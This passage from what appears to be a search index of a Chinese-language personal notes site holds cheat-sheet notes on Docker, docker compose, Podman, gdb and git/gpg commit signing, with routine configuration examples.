\u5728\u672c\u5730\u548c\u5bb9\u5668\u4e4b\u95f4\u590d\u5236\u6587\u4ef6\uff08\u7528\u6cd5\u7c7b\u4f3c scp\uff09</li> </ul>"},{"location":"devops/system/docker/#_4","title":"\u7f51\u7edc\u76f8\u5173","text":"<ul> <li><code>docker network ls</code> \u5217\u51fa\u7f51\u7edc</li> <li><code>docker network create &lt;network&gt;</code> \u521b\u5efa\u7f51\u7edc</li> <li><code>docker network connect &lt;network&gt; &lt;container&gt;</code> \u5c06\u5bb9\u5668\u8fde\u63a5\u5230\u7f51\u7edc</li> <li><code>docker network inspect &lt;network&gt;</code> \u67e5\u770b\u7f51\u7edc\u4fe1\u606f</li> <li><code>docker network rm &lt;network&gt;</code> \u5220\u9664\u7f51\u7edc</li> </ul>"},{"location":"devops/system/docker/#_5","title":"\u4ed3\u5e93\u76f8\u5173","text":"<ul> <li><code>docker login &lt;url&gt;</code> \u8fde\u63a5 registry<ul> <li><code>docker login</code> \u8fde\u63a5\u5230 Docker Hub</li> <li><code>docker login ghcr.io</code> \u8fde\u63a5\u5230 GitHub \u7684\u4ed3\u5e93\uff0c\u7528\u6237\u540d\u662f GitHub \u7528\u6237\u540d\uff0c\u5bc6\u7801\u662f GitHub \u751f\u6210\u7684 token\uff08ghp_ \u5f00\u5934\uff09</li> </ul> </li> <li><code>docker logout &lt;url&gt;</code> \u65ad\u5f00 registry</li> <li><code>docker push &lt;image&gt;</code> \u63a8\u9001\u955c\u50cf\u5230 registry\uff08\u4f1a\u6839\u636e\u524d\u7f00\u81ea\u52a8\u9009\u62e9 registry\uff09</li> <li><code>docker pull &lt;image&gt;</code> \u4ece registry \u62c9\u53d6\u955c\u50cf</li> </ul>"},{"location":"devops/system/docker/#registry","title":"registry \u955c\u50cf","text":"<p>\u53ef\u4ee5\u5229\u7528 registry \u955c\u50cf\u6765\u81ea\u5efa\u79c1\u6709 registry</p> <ul> <li><code>docker pull registry:2</code> \u62c9\u53d6 registry \u955c\u50cf</li> <li>\u9700\u8981\u6302\u8f7d\u7684\u76ee\u5f55<ul> <li><code>./auth:/auth</code>\uff1a\u7528\u6237\u540d\u548c\u5bc6\u7801\u3002\u5728\u672c\u5730 auth \u76ee\u5f55\u4e0b\u6267\u884c <code>docker run --entrypoint htpasswd registry:2.7.0 -Bbn &lt;username&gt; &lt;password&gt; &gt; htpasswd</code> \u751f\u6210\u6587\u4ef6</li> <li><code>./certs:/certs</code>\uff1aSSL \u8bc1\u4e66\uff0c\u53ef\u4ee5\u7528 acme.sh \u6765\u7b7e</li> <li><code>./registry:/var/lib/registry</code>\uff1aregistry \u6570\u636e</li> </ul> </li> <li>\u542f\u52a8 registry\uff1a     <pre><code>docker run -itd -p 5000:5000 --restart=always --name registry \\\n    -v ./certs:/certs \\\n    -v ./auth:/auth \\\n    -v ./registry:/var/lib/registry \\\n    -e \"REGISTRY_HTTP_TLS_CERTIFICATE=/certs/fullchain.cer\" \\\n    -e \"REGISTRY_HTTP_TLS_KEY=/certs/&lt;domain&gt;.key\" \\\n    -e \"REGISTRY_AUTH=htpasswd\" -e \"REGISTRY_AUTH_HTPASSWD_REALM=Registry Realm\" \\\n    -e \"REGISTRY_AUTH_HTPASSWD_PATH=/auth/htpasswd\" \\\n    registry:2\n</code></pre></li> <li><code>docker login &lt;url&gt;</code> \u767b\u5f55 registry</li> <li><code>docker tag &lt;image&gt; &lt;url&gt;/&lt;image&gt;</code> \u7ed9\u955c\u50cf\u6253\u4e0a registry \u7684 tag</li> <li><code>docker push &lt;url&gt;/&lt;image&gt;</code> \u63a8\u9001\u955c\u50cf\u5230 registry</li> </ul>"},{"location":"devops/system/docker/#_6","title":"\u8de8\u5e73\u53f0\u517c\u5bb9\u6027","text":"<ul> <li>\u5229\u7528 buildx \u8de8\u67b6\u6784\u6784\u5efa\uff1a<ul> <li><code>docker buildx build --platform linux/amd64,linux/arm64 -t &lt;image&gt; .</code> </li> </ul> </li> <li>\u8fd0\u884c\u65f6\u6307\u5b9a\u67b6\u6784\uff1a<ul> <li><code>docker run -it -d --platform linux/amd64 ...</code></li> </ul> </li> </ul>"},{"location":"devops/system/docker/#dockerfile","title":"Dockerfile","text":""},{"location":"devops/system/docker/#_7","title":"\u5e38\u7528\u6362\u6e90","text":""},{"location":"devops/system/docker/#ubuntu","title":"Ubuntu \u8f6f\u4ef6\u6e90","text":"<pre><code>RUN sed -i s@/archive.ubuntu.com/@/mirrors.aliyun.com/@g /etc/apt/sources.list\n# RUN sed -i s@/archive.ubuntu.com/@/&lt;...&gt;/@g /etc/apt/sources.list\nRUN apt-get clean\nRUN apt-get update\n</code></pre>"},{"location":"devops/system/docker/#debian","title":"Debian \u8f6f\u4ef6\u6e90","text":"<pre><code>RUN sed -i s/deb.debian.org/mirrors.aliyun.com/g /etc/apt/sources.list &amp;&amp; \\\n    ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime &amp;&amp; echo 'Asia/Shanghai' &gt;/etc/timezone\nRUN apt-get update\n</code></pre>"},{"location":"devops/system/docker/#docker-compose","title":"docker compose","text":"<p>\u5e38\u7528\u6a21\u677f\uff1a</p> <pre><code>name: &lt;project_name&gt;\nservices:\n  &lt;service_name&gt;:\n    image: &lt;image&gt; # build: &lt;path&gt; \u4ece Dockerfile \u6784\u5efa\u955c\u50cf\n    container_name: &lt;container_name&gt;\n    restart: always\n    ports:\n      - &lt;host&gt;:&lt;container&gt;\n    volumes:\n      - &lt;host&gt;:&lt;container&gt;\n    environment:\n      - &lt;key&gt;=&lt;value&gt;\n</code></pre> <ul> <li>restart \u5e38\u7528\u53c2\u6570\uff1a<ul> <li>always\uff1a\u65e0\u8bba\u600e\u4e48\u9000\u51fa\u90fd\u4f1a\u8fdb\u884c\u91cd\u542f\uff0c\u53ef\u4ee5\u5f00\u673a\u81ea\u542f\u52a8</li> <li>unless-stopped\uff1a\u9664\u975e\u624b\u52a8\u505c\u6b62\uff0c\u5426\u5219\u4f1a\u91cd\u542f</li> <li>on-failure\uff1a\u53ea\u5728\u975e\u96f6\u9000\u51fa\u7801\u65f6\u91cd\u542f</li> </ul> </li> <li>ports\uff1a\u7aef\u53e3\u6620\u5c04<ul> <li>\u6307\u5b9a\u76d1\u542c\u7684 IP\uff1a<code>&lt;ip&gt;:&lt;host&gt;:&lt;container&gt;</code>\uff0c\u5982\u679c\u4e0d\u6307\u5b9a IP\uff0c\u5219\u76d1\u542c 0.0.0.0</li> <li>\u76d1\u542c IPv6\uff1a<code>[::]:&lt;host&gt;:&lt;container&gt;</code></li> </ul> </li> <li>command\uff1a\u8986\u76d6\u955c\u50cf\u7684\u9ed8\u8ba4\u547d\u4ee4</li> <li>env_file\uff1a\u6307\u5b9a\u73af\u5883\u53d8\u91cf\u6587\u4ef6</li> </ul> <pre><code>docker compose up -d # \u540e\u53f0\u542f\u52a8\u670d\u52a1\ndocker compose up --build -d # \u6784\u5efa\u955c\u50cf\u5e76\u542f\u52a8\u670d\u52a1\ndocker compose down # \u505c\u6b62\u670d\u52a1\ndocker compose logs -f # \u67e5\u770b\u65e5\u5fd7\n</code></pre>"},{"location":"devops/system/docker/#_8","title":"\u591a\u5bb9\u5668\u7f51\u7edc","text":"<p>\u53ef\u4ee5\u5728\u4e00\u4e2a docker compose \u6587\u4ef6\u7684 services \u4e2d\u5b9a\u4e49\u591a\u4e2a\u5bb9\u5668\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4ed6\u4eec\u4f1a\u52a0\u5165\u540c\u4e00\u4e2a\u7f51\u7edc\uff1a</p> <pre><code>services:\n  app: # \u7701\u7565\u4e86\u5176\u4ed6\u914d\u7f6e\n    links:\n      - db\n    depends_on:\n      - db\n  db:\n    expose:\n      - &lt;port&gt;\n</code></pre> <ul> <li>links\uff1a\u4f7f app \u5bb9\u5668\u53ef\u4ee5\u901a\u8fc7 <code>db</code> \u8bbf\u95ee db \u5bb9\u5668</li> <li>depends_on\uff1a\u5728 db \u5bb9\u5668\u542f\u52a8\u540e\u518d\u542f\u52a8 app \u5bb9\u5668</li> <li>expose\uff1a\u4f7f db \u66b4\u9732\u7aef\u53e3\uff0c\u5982\u679c Dockerfile \u91cc EXPOSE \u4e86\u53ef\u4ee5\u7701\u7565<ul> <li>app \u5bb9\u5668\u53ef\u4ee5\u901a\u8fc7 <code>db:&lt;port&gt;</code> \u94fe\u63a5\u6765\u76f4\u63a5\u8bbf\u95ee\uff08\u6ce8\u610f\u8fd9\u4e2a port \u662f\u5bb9\u5668\u5185\u7aef\u53e3\uff0c\u4e0d\u662f\u6620\u5c04\u7684\u5bbf\u4e3b\u673a\u7aef\u53e3\uff09</li> <li>\u5982\u679c\u5bbf\u4e3b\u673a\u9700\u8981\u8bbf\u95ee db \u5219\u9700\u8981\u901a\u8fc7 ports \u6620\u5c04\u51fa\u6765</li> </ul> </li> </ul> <p>\u5982\u679c\u9700\u8981\u8ba9\u540c\u4e00\u4e2a services \u4e2d\u7684\u4e0d\u540c\u5bb9\u5668\u91c7\u7528\u4e0d\u540c\u7f51\u7edc\uff0c\u5219\u9700\u8981\u901a\u8fc7 networks \u6765\u6307\u5b9a\uff1a</p> <pre><code>services:\n  app: # \u7701\u7565\u4e86\u5176\u4ed6\u914d\u7f6e\n    networks:\n      - appnet\n  db:\n    networks:\n      - dbnet\n\nnetworks:\n  appnet:\n    driver: bridge\n  dbnet:\n    driver: bridge\n</code></pre>"},{"location":"devops/system/docker/#ipv6","title":"IPv6 \u652f\u6301","text":"<p>\u9700\u8981\u6307\u5b9a\u7f51\u7edc\uff0c\u5e76\u4e3a\u7f51\u7edc\u542f\u7528 IPv6 \u652f\u6301\uff1a</p> <pre><code>networks:\n  v6net:\n    enable_ipv6: true\n</code></pre>"},{"location":"devops/system/docker/#healthcheck","title":"healthcheck","text":"<p>\u5bb9\u5668\u5065\u5eb7\u68c0\u67e5\uff0c\u5982\u679c Dockerfile \u6ca1\u6709\u6307\u5b9a HEALTHCHECK\uff0c\u5219\u53ef\u4ee5\u5728 docker compose \u4e2d\u6307\u5b9a\uff1a</p> <pre><code>services:\n  app:\n    healthcheck:\n      test: [\"CMD-SHELL\", \"curl -f http://localhost:8080/health || exit 1\"]\n      interval: 30s # \u68c0\u67e5\u95f4\u9694\n      timeout: 30s  # \u8d85\u65f6\u65f6\u95f4\n      retries: 3    # \u5c1d\u8bd5\u6b21\u6570\n      start_period: 0s  # \u5bb9\u5668\u542f\u52a8\u540e\u591a\u4e45\u5f00\u59cb\u7b2c\u4e00\u6b21\u68c0\u6d4b\n</code></pre> <p>\u5728\u591a\u5bb9\u5668 depends_on \u65f6\uff0c\u53ef\u4ee5\u4f9d\u8d56\u4e8e\u5065\u5eb7\u76d1\u6d4b\u7ed3\u679c\uff1a</p> <pre><code>depends_on:\n  db:\n    condition: service_healthy\n</code></pre> <p>service_started \u8868\u793a\u5bb9\u5668\u542f\u52a8\uff0cservice_completed_successfully \u8868\u793a\u5bb9\u5668\u6210\u529f\u5b8c\u6210\uff0cservice_healthy \u8868\u793a\u5bb9\u5668\u5065\u5eb7\u68c0\u67e5\u901a\u8fc7\u3002</p>"},{"location":"devops/system/docker/#composerize","title":"composerize","text":"<p> composerize/composerize \u53ef\u4ee5\u5c06 docker run \u7684\u547d\u4ee4\u8f6c\u6362\u4e3a docker compose \u6587\u4ef6\uff1a</p> <pre><code>npm install -g composerize\ncomposerize docker run ... &gt; docker-compose.yml\n</code></pre> <p>\u4e5f\u53ef\u4ee5\u901a\u8fc7\u5728\u7ebf\u670d\u52a1 https://composerize.com/ \u6765\u8f6c\u6362\u3002\u540c\u65f6\u4e5f\u6709 docker compose \u8f6c\u547d\u4ee4\u7684\u7248\u672c  composerize/decomposerize\u3002</p>"},{"location":"devops/system/docker/#podman","title":"podman","text":"<p>podman \u5728\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u53ef\u4ee5\u66ff\u4ee3 docker\uff0c\u62e5\u6709\u66f4\u597d\u7684 rootless \u652f\u6301\u4e14\u4e0d\u9700\u8981\u5b88\u62a4\u8fdb\u7a0b\uff0c\u800c\u4e14 cockpit \u6709\u5c5e\u4e8e podman \u7684\u7ba1\u7406\u754c\u9762\uff0c\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7 apt \u5b89\u88c5\uff0c\u5e76\u901a\u8fc7 pip \u5b89\u88c5 podman-compose\uff1a</p> <pre><code>sudo apt install podman\npip install podman-compose\n</code></pre> <p>\u539f docker \u547d\u4ee4\u90fd\u53ef\u4ee5\u5c06 docker \u66ff\u6362\u4e3a podman \u6765\u4f7f\u7528\uff0cdocker compose \u4e5f\u53ef\u4ee5\u66ff\u6362\u4e3a podman-compose\u3002</p> <p>\u9700\u8981\u6ce8\u610f\u7684\uff1a</p> <ul> <li>podman \u9ed8\u8ba4 rootless\uff0c\u666e\u901a\u7528\u6237\u548c root \u7528\u6237\u76f8\u5f53\u4e8e\u4e0d\u540c\u7684\u73af\u5883\uff08\u5305\u62ec\u62c9\u53d6\u4e0b\u6765\u7684\u672c\u5730\u955c\u50cf\uff09</li> <li>\u9632\u706b\u5899\u5f00\u5173\u6216\u4fee\u6539\u540e\u9700\u8981\u91cd\u8f7d\u7f51\u7edc\uff1a<code>podman network reload -a</code></li> </ul>"},{"location":"devops/system/docker/#_9","title":"\u5176\u4ed6\u95ee\u9898","text":""},{"location":"devops/system/docker/#host","title":"\u5bb9\u5668\u5185\u8bbf\u95ee host \u7aef\u53e3","text":"<p>\u5bb9\u5668\u7684\u7aef\u53e3\u6620\u5c04\u662f\u5c06\u5bb9\u5668\u5185\u7684\u7aef\u53e3\u6620\u5c04\u5230 host \u4e0a\uff0c\u5e76\u4e0d\u80fd\u5b9e\u73b0\u4ece\u5bb9\u5668\u5185\u53cd\u5411\u8bbf\u95ee host \u7aef\u53e3\u7684\u670d\u52a1\u3002\u800c\u4e14\u4ece localhost:port \u8fdb\u884c\u8bbf\u95ee\u7684\u8bdd\uff0clocalhost \u4ecd\u8868\u793a\u5bb9\u5668\u672c\u8eab\uff0c\u800c\u975e\u5bbf\u4e3b\u673a\u3002</p> <p>docker \u53ef\u4ee5\u901a\u8fc7\u6dfb\u52a0\u989d\u5916\u7684 host \u6307\u5411 host-gateway \u6765\u5b9e\u73b0\uff1a</p> <pre><code>extra_hosts:\n  - \"host.docker.internal:host-gateway\"\n# \u547d\u4ee4\uff1a--add-host=host.docker.internal:host-gateway\n</code></pre> <p>podman \u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 <code>host.containers.internal</code> \u6765\u8868\u793a\u5bbf\u4e3b\u673a\u3002</p>"},{"location":"devops/system/docker/#_10","title":"\u7a7a\u95f4\u6e05\u7406","text":"<p>podman \u548c docker \u7528\u6cd5\u4e00\u81f4\uff1a</p> <ul> <li>docker system df\uff1a\u67e5\u770b\u5360\u7528\u7a7a\u95f4\u60c5\u51b5\uff08-v \u66f4\u7ec6\u81f4\uff09</li> <li>docker system prune\uff1a\u6e05\u7406\u6240\u6709\u5df2\u505c\u6b62\u5bb9\u5668\u3001\u672a\u88ab\u4f7f\u7528\u7684\u7f51\u7edc\u3001dangling \u955c\u50cf\u3001\u672a\u4f7f\u7528\u7684\u6784\u5efa\u7f13\u5b58</li> <li>docker image prune\uff1a\u6e05\u7406 dangling \u955c\u50cf<ul> <li>\u53ef\u80fd\u4f1a\u6b8b\u7559 <code>&lt;none&gt;</code> \u955c\u50cf\uff0c\u4f7f\u7528 docker image prune --filter \"dangling=true\" \u5220\u9664</li> </ul> </li> <li>docker image prune -a\uff1a\u5220\u9664\u6240\u6709\u672a\u88ab\u4f7f\u7528\u7684\u955c\u50cf</li> </ul>"},{"location":"devops/system/docker/#_11","title":"\u7528\u6237\u6743\u9650\u95ee\u9898","text":"<p>rootful \u7684 podman \u4f1a\u4ee5 root \u7528\u6237\u8eab\u4efd\u8fd0\u884c\u5bb9\u5668\uff0c\u8fd9\u6837\u5bb9\u5668\u5185\u521b\u5efa\u7684\u6587\u4ef6\u7684 owner \u5c31\u90fd\u662f root\uff0c\u4f1a\u5f88\u4e0d\u65b9\u4fbf\u3002</p> <p>\u4e00\u79cd\u65b9\u6cd5\u662f\u4f7f\u7528 --user \u9009\u9879\u6307\u5b9a\u7528\u6237\u7684 uid \u548c gid\uff0c\u6216\u5728 compose \u6587\u4ef6\u4e2d\uff1a</p> <pre><code>services:\n  app:\n    user: 1000:1000\n</code></pre> <p>\u4f46\u8fd9\u6837\u7684\u53e6\u4e00\u4e2a\u95ee\u9898\u5c31\u662f\u5982\u679c\u9700\u8981\u8bbf\u95ee\u6216\u4fee\u6539\u5bb9\u5668\u4e2d\u81ea\u5e26\u7684\u9700\u8981 root \u6743\u9650\u7684\u6587\u4ef6\uff0c\u5c31\u4f1a\u6743\u9650\u4e0d\u8db3\u3002\u4f8b\u5982\u5728 OpenList \u4e2d\uff0c<code>/opt</code> \u76ee\u5f55\u5728\u955c\u50cf\u4e2d\u662f openlist(1001) \u7528\u6237\u7684\uff0c\u5b98\u65b9\u7ed9\u51fa\u4e86\u53ef\u4ee5\u7528 user \u4fee\u6539\u7528\u6237\u7684\u63d0\u793a\uff0c\u4f46\u7528 podman \u90e8\u7f72\u65f6\u4f1a\u51fa\u73b0\uff1a</p> <pre><code>chown: /opt: Operation not permitted\nsu-exec: setgroups(1000): Operation not permitted\n</code></pre> <p>\u8bf4\u660e\u5728\u5bb9\u5668\u8fd0\u884c\u8d77\u6765\u4e4b\u540e\u5bb9\u5668\u5185\u5c31\u662f user \u6307\u5b9a\u7684 1000 \u7528\u6237\u7684\u6743\u9650\u4e86\uff0c\u5bfc\u81f4\u65e0\u6cd5\u4fee\u6539 1001 \u7684 owner \u5230\u81ea\u8eab\u3002</p> <p>\u4e00\u4e2a\u89e3\u51b3\u65b9\u6cd5\u662f\u5229\u7528 uidmap\uff0c\u5b83\u7684\u503c\u662f\u5192\u53f7\u5206\u5272\u7684\u4e09\u4e2a\u6570\uff0c\u5206\u522b\u662f\u5bb9\u5668\u5185 uid \u7684\u8d77\u70b9\u3001\u6620\u5c04\u5230\u4e3b\u673a uid \u7684\u8d77\u70b9\u4ee5\u53ca\u6620\u5c04\u7684\u957f\u5ea6\u3002\u90a3\u4e48\u5c31\u53ef\u4ee5\u5c06\u4e3b\u673a\u7684 1000 \u7528\u6237\u5bf9\u5e94\u8fdb\u5bb9\u5668\u5185\u7684 0 \u4e5f\u5c31\u662f root \u7528\u6237\uff0c\u8fd9\u6837\u5bb9\u5668\u5185\u770b\u662f root \u7528\u6237\uff0c\u5230\u4e3b\u673a\u4e0a\u770b\u5c31\u662f 1000 \u666e\u901a\u7528\u6237\uff0c\u5bb9\u5668\u5185\u521b\u5efa\u7684\u6587\u4ef6\u4e5f\u662f\u666e\u901a\u7528\u6237\u7684\u4e86\uff1a</p> <pre><code>services:\n  app:\n    user: 0:0         # \u5bb9\u5668\u5185\u662f root(0) \u7528\u6237\n    uidmap: 0:1000:1  # \u5c06\u5bb9\u5668\u5185\u7684 0 \u6620\u5c04\u5230\u4e3b\u673a\u7684 1000\n</code></pre>"},{"location":"devops/system/gdb/","title":"gdb \u76f8\u5173\u4f7f\u7528\u5907\u5fd8","text":"<p> \u7ea6 450 \u4e2a\u5b57  2 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 2 \u5206\u949f</p> <p>Abstract</p> <p>\u548c gdb \u76f8\u5173\u7684\u4e00\u4e9b\u6307\u4ee4\u5907\u5fd8\u3001\u63d2\u4ef6\u5b89\u88c5\u65b9\u5f0f\u7b49</p>"},{"location":"devops/system/gdb/#gdb_1","title":"gdb \u547d\u4ee4","text":""},{"location":"devops/system/gdb/#_1","title":"\u8fd0\u884c","text":"<ul> <li><code>(gdb) run</code> \u76f4\u63a5\u8fd0\u884c (r)</li> <li><code>(gdb) continue</code> \u7ee7\u7eed\u8fd0\u884c (c)</li> <li><code>(gdb) step</code> \u8fd0\u884c\u5230\u4e0b\u4e00\u6761\u6e90\u7801 (s)</li> <li><code>(gdb) stepi</code> \u8fd0\u884c\u5230\u4e0b\u4e00\u6761\u6307\u4ee4 (si)</li> <li><code>(gdb) next</code> \u5355\u6b65\u8fd0\u884c\uff0c\u8df3\u8fc7\u51fd\u6570 (n)</li> <li><code>(gdb) finish</code> \u8fd0\u884c\u5b8c\u5f53\u524d\u51fd\u6570 (fin)</li> <li><code>(gdb) attach &lt;pid&gt;</code> \u8fde\u63a5\u7a0b\u5e8f</li> <li><code>(gdb) detach</code> \u4ece\u5f53\u524d\u7a0b\u5e8f\u65ad\u8fde</li> <li><code>(gdb) target remote localhost:1234</code> \u8fde\u63a5 qemu</li> </ul>"},{"location":"devops/system/gdb/#_2","title":"\u65ad\u70b9","text":"<ul> <li><code>(gdb) break main</code> \u65ad\u5728\u7b26\u53f7\u5904 (b)</li> <li><code>(gdb) break *0x....</code> \u65ad\u5728\u5730\u5740</li> <li><code>(gdb) info breakpoints</code> \u67e5\u770b\u65ad\u70b9\u53ca\u72b6\u6001 (i b)</li> <li><code>(gdb) delete / clear</code> \u6e05\u9664\u6240\u6709\u65ad\u70b9 (d/cl)</li> <li><code>(gdb) delete &lt;breakpoint#&gt;</code> \u5220\u9664\u67d0\u4e00\u65ad\u70b9\uff08\u4ece i b \u5f97\u6765\u65ad\u70b9\u53f7\uff09</li> <li><code>(gdb) clear ...</code> \u6e05\u9664\u67d0\u4e00\u7b26\u53f7\u3001\u5730\u5740\u5904\u7684\u65ad\u70b9</li> <li><code>(gdb) disable &lt;breakpoint#&gt;</code> \u7981\u7528\u67d0\u4e00\u65ad\u70b9</li> <li><code>(gdb) enable &lt;breakpoint#&gt;</code> \u542f\u7528\u67d0\u4e00\u65ad\u70b9</li> <li><code>(gdb) watch ...</code> \u5728\u67d0\u5904\u589e\u52a0\u89c2\u5bdf\u70b9\uff0cdelete\u3001enable\u3001disable \u4e0e\u65ad\u70b9\u5171\u7528</li> <li><code>(gdb) break/watch &lt;where&gt; if &lt;condition&gt;</code> \u5982\u679c\u6761\u4ef6\u6ee1\u8db3\u5219\u65ad</li> <li><code>(gdb) condition &lt;breakpoint#&gt; &lt;condition&gt;</code> \u66f4\u6539\u6761\u4ef6</li> </ul>"},{"location":"devops/system/gdb/#_3","title":"\u8c03\u7528\u6808","text":"<ul> <li><code>(gdb) backtrace</code> \u67e5\u770b\u8c03\u7528\u6808 (bt)</li> <li><code>(gdb) frame</code> \u67e5\u770b\u5f53\u524d\u5e27\u6808</li> <li><code>(gdb) up/down</code> \u79fb\u52a8\u5f53\u524d\u5e27\u6808\uff08\u5411 main / \u8fdc\u79bb main\uff09</li> <li><code>(gdb) info locals</code> \u67e5\u770b\u5f53\u524d\u5e27\u6808\u53d8\u91cf</li> <li><code>(gdb) info args</code> \u67e5\u770b\u51fd\u6570\u53c2\u6570</li> </ul>"},{"location":"devops/system/gdb/#_4","title":"\u67e5\u770b\u5bc4\u5b58\u5668/\u53d8\u91cf/\u5185\u5b58","text":"<ul> <li><code>(gdb) print/format &lt;what&gt;</code><ul> <li><code>format</code><ul> <li>a: pointer</li> <li>c: int -&gt; char</li> <li>d: signed decimal</li> <li>f: floating point number</li> <li>o: int -&gt; octal</li> <li>s: treat as string</li> <li>t: int -&gt; bin</li> <li>u: unsigned decimal</li> <li>x: int -&gt; hex</li> </ul> </li> <li><code>&lt;what&gt;</code><ul> <li>\u53ef\u4ee5\u662f\u7c7b C \u8868\u8fbe\u5f0f</li> <li>\u53ef\u4ee5\u662f file_name::variable_name</li> <li>\u53ef\u4ee5\u662f function::variable_name</li> <li>\u53ef\u4ee5\u662f {type}address</li> <li>\u53ef\u4ee5\u662f $register</li> </ul> </li> </ul> </li> <li><code>(gdb) display/format &lt;what&gt;</code></li> <li><code>(gdb) undisplay &lt;display#&gt;</code></li> <li><code>(gdb) enable display &lt;display#&gt;</code></li> <li><code>(gdb) disable display &lt;display#&gt;</code></li> <li><code>(gdb) x/nfu &lt;address&gt;</code> \u663e\u793a\u5185\u5b58<ul> <li>n \u8868\u793a\u67e5\u627e\u3001\u6253\u5370\u51e0\u4e2a\u5355\u4f4d</li> <li>f \u8868\u793a format\uff0c\u5728\u524d\u9762\u5199\u4e86</li> <li>u \u8868\u793a\u5355\u4f4d\uff1ab \u4e00\u5b57\u8282\u3001h \u4e24\u5b57\u8282\u3001w \u56db\u5b57\u8282\u3001g \u516b\u5b57\u8282</li> </ul> </li> <li><code>(gdb) info register</code> \u67e5\u770b\u6240\u6709\u5bc4\u5b58\u5668 (i r)</li> <li><code>(gdb) info register &lt;register&gt;</code> \u67e5\u770b\u67d0\u4e00\u5bc4\u5b58\u5668</li> </ul>"},{"location":"devops/system/gdb/#gdb_2","title":"gdb \u63d2\u4ef6","text":""},{"location":"devops/system/gdb/#gdb-peda","title":"gdb-peda","text":"<p>\u6bcf\u6761\u6307\u4ee4\u5e26\u5bc4\u5b58\u5668\u3001\u6c47\u7f16\u3001\u5185\u5b58\u6570\u636e\u56de\u663e <pre><code>$ git clone https://github.com/longld/peda.git ~/peda\n$ echo \"source ~/peda/peda.py\" &gt;&gt; ~/.gdbinit\n</code></pre></p>"},{"location":"devops/system/git/","title":"Git \u76f8\u5173\u4f7f\u7528\u4e0e\u914d\u7f6e","text":"<p> \u7ea6 627 \u4e2a\u5b57  35 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 3 \u5206\u949f</p> <p>Abstract</p> <p>\u4e00\u4e9b\u5e38\u7528/\u5e38\u5fd8\u7684 git \u547d\u4ee4\uff0c\u548c\u57fa\u7840\u7684\u914d\u7f6e</p>"},{"location":"devops/system/git/#_1","title":"\u57fa\u7840\u547d\u4ee4","text":""},{"location":"devops/system/git/#_2","title":"\u5206\u652f","text":"<ul> <li><code>git checkout -b &lt;branch_name&gt;</code>\uff1a\u521b\u5efa\u5206\u652f\uff0c\u5e76\u5207\u6362\u8fc7\u53bb</li> <li><code>git checkout master</code>\uff1a\u56de\u5230\u4e3b\u5206\u652f</li> <li><code>git push origin &lt;branch_name&gt;</code>\uff1a\u5c06\u5206\u652f\u63a8\u9001\u5230\u8fdc\u7a0b\u4ed3\u5e93</li> <li><code>git pull</code>\uff1a\u5c06\u672c\u5730\u4ed3\u5e93\u66f4\u65b0</li> <li><code>git diff &lt;branch_name&gt; master</code>\uff1a\u663e\u793a\u5dee\u522b</li> </ul>"},{"location":"devops/system/git/#_3","title":"\u514b\u9686\u5206\u652f","text":"<ul> <li><code>git clone -b &lt;branch_name&gt; &lt;repo_url&gt;</code>\uff1a\u514b\u9686\u5355\u4e2a\u5206\u652f</li> <li><code>git branch -a</code>\uff1a\u67e5\u770b\u6240\u6709\u5206\u652f</li> <li><code>git checkout -b &lt;branch_name&gt; origin/&lt;branch_name&gt;</code>\uff1a\u5173\u8054\u5206\u652f</li> </ul>"},{"location":"devops/system/git/#_4","title":"\u6e05\u9664\u547d\u4ee4","text":"<ul> <li><code>git rm --cached &lt;file&gt;</code>\uff1a\u5df2 add \u672a commit \u7684\u6587\u4ef6\u9000\u56de\u672a add \u72b6\u6001</li> <li><code>git checkout -- &lt;file&gt;</code>\uff1a\u5df2\u4fee\u6539\u7684\u6587\u4ef6\u64a4\u9500\u4fee\u6539</li> <li><code>git reset --soft HEAD^</code>\uff1a\u64a4\u9500 commit\uff08\u4e0d\u66f4\u6539\u6587\u4ef6\uff09</li> <li><code>git reset --hard HEAD^</code>\uff1a\u64a4\u9500 commit\uff08\u6587\u4ef6\u56de\u9000\u5230\u4e0a\u4e00\u7248\u672c\uff09</li> <li><code>git update-ref -d HEAD</code>\uff1a\u64a4\u9500\u7b2c\u4e00\u6761 commit\uff08\u4e0d\u66f4\u6539\u6587\u4ef6\uff09</li> <li><code>git push -f</code>\uff1a\u5f3a\u5236\u63a8\u9001\uff0c\u8986\u76d6 commit</li> </ul>"},{"location":"devops/system/git/#gpg-commit","title":"gpg \u7b7e\u7f72 commit","text":""},{"location":"devops/system/git/#gpg","title":"\u751f\u6210 gpg \u5bc6\u94a5","text":"<pre><code>gpg --full-generate-key\n</code></pre> <p>\u9ed8\u8ba4\u5373\u53ef\uff08ECC ed25519 \u7b7e\u540d\u548c\u52a0\u5bc6\uff09\uff0c\u7b7e\u540d\u5176\u5b9e\u5c31\u591f\uff0c\u4f46 ed25519 \u672c\u6765\u5c31\u6ca1\u591a\u957f\uff0c\u518d\u52a0\u4e00\u4e2a\u52a0\u5bc6\u53ef\u4ee5\u7b49\u4ee5\u540e\u7528\u3002</p> <p>\u63a5\u7740\u9700\u8981\u62ff\u5230 key id\uff08fingerprint \u7684\u672b\u5c3e\u5b57\u8282\uff09\uff0ced25519 \u659c\u6760\u540e\u9762\u7684\u5c31\u662f key id\uff1a</p> <pre><code>gpg --list-secret-keys --keyid-format=long\n</code></pre> <p>\u7136\u540e\u9700\u8981\u5c06\u516c\u94a5\u4e0a\u4f20\u5230 github\uff1a</p> <pre><code>gpg --armor --export &lt;key_id&gt;\n</code></pre>"},{"location":"devops/system/git/#gpg_1","title":"\u5bfc\u5165\u5bfc\u51fa gpg \u5bc6\u94a5","text":"<p>\u5728\u4e0d\u540c\u7684\u8bbe\u5907\u4e0a\u7528\u540c\u4e00\u4e2a gpg key \u9700\u8981\u5bfc\u51fa\u5bfc\u5165\u5bc6\u94a5\uff1a</p> <pre><code>gpg -a -o private.key --export-secret-keys &lt;key_id&gt;\n...\ngpg --import private.key\n</code></pre> <p>\u4f46\u662f uid \u662f\u4e0d\u53d7\u4fe1\u4efb\u7684\uff0c\u53ef\u4ee5 <code>gpg --edit-key &lt;key_id&gt;</code> \u4e4b\u540e trust 